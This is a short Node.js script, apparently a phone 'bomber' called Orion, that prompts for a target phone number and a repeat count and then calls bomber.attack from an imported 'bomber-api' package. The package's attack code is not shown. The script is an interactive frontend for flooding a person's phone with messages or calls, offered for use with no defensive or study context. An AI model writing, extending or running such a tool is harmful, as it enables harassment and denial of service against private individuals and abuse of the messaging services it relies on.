const bomber = require("bomber-api");
const inquirer = require("inquirer");
const { clear } = require("console");
const { exit } = require("process");

clear();

console.log("________        .__               ");
console.log("\\_____  \\_______|__| ____   ____  ");
console.log(" /   |   \\_  __ \\  |/  _ \\ /    \\ ");
console.log("/    |    \\  | \\/  (  <_> )   |  \\");
console.log("\\_______  /__|  |__|\\____/|___|  /");
console.log("        \\/                     \\/ ");

call(async function () {
	let questions = [
		{
			type: "input",
			name: "targetNumber",
			message: "Target Number: ",
			validate: function (input) {
				if (!/[8-8]{1,1}[0-9]{1,3}[0-9]{1,3}[0-9]{1,2}[0-9]{1,2}/.test(input)) {
					return "Please Enter Valid Phone Number... (8XXXXXXXXXX)";
				} else {
					return true;
				}
			},
			filter: function (input) {
				if (!/[8-8]{1,1}[0-9]{1,3}[0-9]{1,3}[0-9]{1,2}[0-9]{1,2}/.test(input)) {
					return "";
				} else {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "nor",
			message: "Number Of Repeats: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please Enter The Number...";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "start",
			message: "Start? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() === "y" || value.toLowerCase() === "n";
				return valid || "Please Enter Y/N...";
			},
			filter: function (input) {
				if (input.toLowerCase() === "y" || input.toLowerCase() === "n") {
					return input;
				}
				return "";
			},
		},
	];
	const info = await inquirer.prompt(questions);
	if (info.start.toLowerCase() == "y") {
		bomber.attack(info.targetNumber, info.nor);
	} else {
		setTimeout(exit(), 3000);
	}
});

function call(func) {
	return func();
}
